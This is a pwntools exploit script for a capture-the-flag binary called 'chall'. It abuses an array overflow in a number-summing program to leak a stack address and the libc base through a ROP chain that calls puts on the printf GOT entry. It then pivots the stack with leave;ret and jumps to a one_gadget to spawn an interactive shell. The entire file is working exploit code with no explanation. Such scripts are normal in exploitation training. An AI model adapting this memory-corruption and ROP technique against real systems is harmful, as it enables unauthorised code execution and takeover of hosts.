from pwn import *

R = process('./chall')

elf = ELF('./chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc-2.23.so')

pop_rdi = 0x400a83
leave_ret = 0x400849

one_gadget = 0x10a38c

def input_n(r, n):
    r.sendlineafter('n = ', str(n))

def calc_sum(r, all_num):
    for num in all_num:
        r.sendlineafter('num[', str(num))
    r.recvuntil('SUM = ')
    return int(r.recvline()[:-1])

def stack_leak(r):
    input_n(r, 22)
    payload = [0 for  i in range(16)]
    payload[-2] = 20
    payload[-1] = elf.symbols[b'_start']
    first = calc_sum(r, payload)

    input_n(r, 22)
    payload = [0 for i in range(19)]
    payload[-5] = 17
    payload[-4] = 0
    payload[-3] = 0
    payload[-2] = 0
    payload[-1] = elf.symbols[b'_start']
    second = calc_sum(r, payload)
    addr_array = (first - 28 - 0xb0) - (second - 28 + 0xe0) - 0x1c0
    log.info("addr of array top: " + hex(addr_array))
    return addr_array

def leak_libcbase(r, addr_array):
    input_n(r, 22)
    payload = [0 for i in range(17)]
    payload[1] = pop_rdi
    payload[2] = elf.symbols[b'got.printf']
    payload[3] = elf.symbols[b'puts']
    payload[4] = elf.symbols[b'_start']
    payload[-3] = 19
    payload[-2] = addr_array
    payload[-1] = leave_ret
    calc_sum(r, payload)
    libc_printf = u64(r.recvline()[:-1].ljust(8,b'\x00'))
    libc_base = libc_printf - libc.symbols[b'printf']
    log.info("libc base: " + hex(libc_base))
    return libc_base

def run_onegadget(r, libc_base):
    input_n(r, 22)
    payload = [0 for i in range(16)]
    payload[-2] = 20
    payload[-1] = libc_base + one_gadget
    calc_sum(r, payload)
    r.interactive()

def main(r):
    addr_array = stack_leak(r)
    libc_base = leak_libcbase(r, addr_array)
    run_onegadget(r, libc_base)

if __name__ == '__main__':
    main(R)
